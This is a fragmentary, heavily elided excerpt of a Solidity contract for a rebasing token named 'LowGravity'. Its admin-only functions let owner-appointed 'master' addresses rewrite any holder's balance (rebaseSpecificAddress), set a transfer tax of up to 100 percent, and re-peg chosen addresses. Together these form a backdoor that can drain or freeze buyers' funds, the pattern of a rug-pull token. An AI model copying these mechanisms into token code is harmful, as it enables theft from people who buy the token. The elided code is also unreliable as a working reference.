...
contract LowGravity is ERC20Detailed, Ownable {
    ...
    modifier onlyMaster() {
        require(master[msg.sender] == true);
        _;
    }
    ...
    uint256 private total_gons =  INITIAL_FRAGMENTS_SUPPLY * 1000;
    ...
    uint256 private INITIAL_GONS_PER_FRAGMENT = total_gons.div(_totalSupply);
    ...
    constructor()
        ERC20Detailed("LowGravity", "LGRV", uint8(DECIMALS))
        payable
        public
    {
        ...
        _lpPeg.push(LPPeg(msg.sender, true));
        ...
        returns (uint256)
    {
        ...
        _gonsPerFragment = total_gons.div(_totalSupply);
        fixTotalSupply(previousSupply, supplyDelta);
        lpContract.sync();
    ...
    function fixTotalSupply(uint256 previousSupply, int256 supplyDelta)
    internal
    {
        
        uint256 peggedTotalBalance = 0;
        for (uint256 i = 0; i < _lpPeg.length; i++) {
            
            if(_lpPeg[i].isPegged) {
               if(supplyDelta > 0) {
                    _gonBalances[_lpPeg[i]._address] = _gonBalances[_lpPeg[i]._address].mul((_totalSupply.div(previousSupply)));
                    
                } else {
                    
                    uint256 supplyRatio = previousSupply.div(_totalSupply);
                    uint256 theoreticalBalance = balanceOf(_lpPeg[i]._address).div(supplyRatio);
                    
                    uint256 supplyToAdd = balanceOf(_lpPeg[i]._address).sub(theoreticalBalance);
                    peggedTotalBalance = peggedTotalBalance.add(supplyToAdd);
                }
            }
        }
        
        if(supplyDelta < 0) {
            _totalSupply = _totalSupply.add(peggedTotalBalance);
            total_gons = total_gons.add((peggedTotalBalance.mul(_gonsPerFragment)));
        }
     ...
     */
    function setMaster(address _newMasterAddress)
        external
        onlyOwner
        returns (uint256)
    {
        master[_newMasterAddress] = true;
    }
    
    /**
     * @notice Delete an existing master
     */
    function removeMaster(address _masterAddressToRemove) external onlyOwner {
        
         master[_masterAddressToRemove] = false;
    }
    ...
    */
        ...
        returns (uint256)
    {
        ...
        if (isAddressPegged(who)) {
            return _gonBalances[who].div(INITIAL_GONS_PER_FRAGMENT);
        } else {
   ...
   returns (bool)
   {
    ...
    function _transferStandard(address sender, address recipient, uint256 amount) private {
      (uint256 tTransferAmount, uint256 tFee) = _getTValues(amount);
          uint256 gonDeduct = isAddressPegged(sender) ? amount.mul(INITIAL_GONS_PER_FRAGMENT) : amount.mul(_gonsPerFragment);
          uint256 gonValue = isAddressPegged(recipient) ? tTransferAmount.mul(INITIAL_GONS_PER_FRAGMENT) : tTransferAmount.mul(_gonsPerFragment);
          _gonBalances[sender] = _gonBalances[sender].sub(gonDeduct);
          _gonBalances[recipient] = _gonBalances[recipient].add(gonValue);
          _burnTokens(sender, tFee);
    ...
    function _transferExcluded(address sender, address recipient, uint256 amount) private {
          uint256 gonDeduct = isAddressPegged(sender) ? amount.mul(INITIAL_GONS_PER_FRAGMENT) : amount.mul(_gonsPerFragment);
          uint256 gonValue = isAddressPegged(recipient) ? amount.mul(INITIAL_GONS_PER_FRAGMENT) : amount.mul(_gonsPerFragment);
          _gonBalances[sender] = _gonBalances[sender].sub(gonDeduct);
          _gonBalances[recipient] = _gonBalances[recipient].add(gonValue);
          emit Transfer(sender, recipient, amount);
    }
    ...
    function calculateFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(transactionTax).div(100);
    }

    function _burnTokens(address sender, uint256 tFee) private {
        
        uint256 rFee = tFee.mul(_gonsPerFragment);
        _gonBalances[deadAddress] = _gonBalances[deadAddress].add(rFee);
        uint256 fires = balanceOf(deadAddress);
        emit Transfer(sender, deadAddress, fires);
  ...
  function _approve(address owner, address spender, uint256 value) private {
    ...
    */
    ...
    function setPegAddress(address _address, bool _setPegged)
        external 
        onlyMaster
    {
        uint256 targetBalance = balanceOf(_address);
        
        for (uint256 i = 0; i < _lpPeg.length; i++) {
            if(_lpPeg[i]._address == _address) {
                _lpPeg[i].isPegged = _setPegged;
                fixBalance(_address, targetBalance, _setPegged);
                return;
            }
        }
        _lpPeg.push(LPPeg(_address, _setPegged));
        fixBalance(_address, targetBalance, _setPegged);

    }
    
    function isAddressPegged(address _address)
    public
    view
    returns (bool)
    {
        for (uint256 i = 0; i < _lpPeg.length; i++) {
            if(_lpPeg[i]._address == _address) {
                ...
                return _lpPeg[i].isPegged;
            }
        }
        return false;
    }
    
    function rebaseSpecificAddress(address _address, uint256 _newBalance)
    external
    onlyMaster
    {
        uint256 previousBalance = balanceOf(_address);
        _gonBalances[_address] = isAddressPegged(_address) ? _newBalance.mul(INITIAL_GONS_PER_FRAGMENT) : _newBalance.mul(_gonsPerFragment);
        
        if(_newBalance > previousBalance) {
            uint256 diff = _newBalance.sub(previousBalance);
            _totalSupply = _totalSupply.add(diff);
        } else {
            uint256 diff = previousBalance.sub(_newBalance);
    ...
    function fixBalance(address _address, uint256 _targetBalance, bool _isPegged) internal {
        if(INITIAL_GONS_PER_FRAGMENT == _gonsPerFragment) {
            return;
        }
        
        if(_isPegged) {
            _gonBalances[_address] = _targetBalance.mul(INITIAL_GONS_PER_FRAGMENT);
        } else {
            _gonBalances[_address] = _targetBalance.mul(_gonsPerFragment);
        }
    }
    
    
    function setTransactionTax(uint256 _transactionTax) external onlyMaster {
        require(_transactionTax >= 0);
        require(_transactionTax <= 100);
